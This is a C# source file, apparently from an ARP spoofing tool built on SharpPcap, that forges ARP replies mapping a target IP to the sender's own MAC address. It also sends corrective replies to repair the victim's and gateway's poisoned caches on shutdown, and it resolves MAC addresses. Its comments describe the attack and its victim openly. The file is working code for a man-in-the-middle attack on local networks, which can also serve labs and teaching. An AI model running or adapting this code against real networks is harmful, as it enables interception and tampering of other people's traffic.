using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net;
using System.Net.NetworkInformation;

class Arp_Class
{
    public static Packet BuildArpPacket(IPAddress pDestIPAddr, IPAddress pSourceIPAddr, PhysicalAddress pDestHwAddr, LibPcapLiveDevice pLiveDevice)
    {
        EthernetPacket ethernetPacket = new(pLiveDevice.MacAddress, pDestHwAddr, EthernetType.Arp);
        ArpPacket arpframe = new(ArpOperation.Response, pDestHwAddr, pDestIPAddr, pLiveDevice.MacAddress, pSourceIPAddr);
        ethernetPacket.PayloadPacket = arpframe;
        return ethernetPacket;
    }

    /// <summary>
    /// Builds a truthful ARP reply announcing that <paramref name="pOwnerIPAddr"/> really belongs to
    /// <paramref name="pOwnerHwAddr"/>. Used on shutdown to repair the caches the attack poisoned, so the
    /// victim and gateway relearn the correct mapping immediately instead of waiting for it to time out.
    /// </summary>
    public static Packet BuildCorrectiveArpReply(IPAddress pOwnerIPAddr, PhysicalAddress pOwnerHwAddr, IPAddress pDestIPAddr, PhysicalAddress pDestHwAddr)
    {
        EthernetPacket ethernetPacket = new(pOwnerHwAddr, pDestHwAddr, EthernetType.Arp);
        ArpPacket arpframe = new(ArpOperation.Response, pDestHwAddr, pDestIPAddr, pOwnerHwAddr, pOwnerIPAddr);
        ethernetPacket.PayloadPacket = arpframe;
        return ethernetPacket;
    }

    public static PhysicalAddress? GetPhysicalAddress(IPAddress pIPAddress, LibPcapLiveDevice pLiveDevice)
    {
        ARP arper = new(pLiveDevice);

        // Resolve once - the previous version called Resolve() a second time for
        // the return value, doubling the blocking network round-trip.
        PhysicalAddress? resolvedPhyAddr = arper.Resolve(pIPAddress);

        if (resolvedPhyAddr == null)
        {
            Console.WriteLine("#> MAC address could not be resolved! Make sure that the IP is reachable. Press \"ENTER\" to continue.");
            Console.ReadLine();
        }

        return resolvedPhyAddr;
    }
}
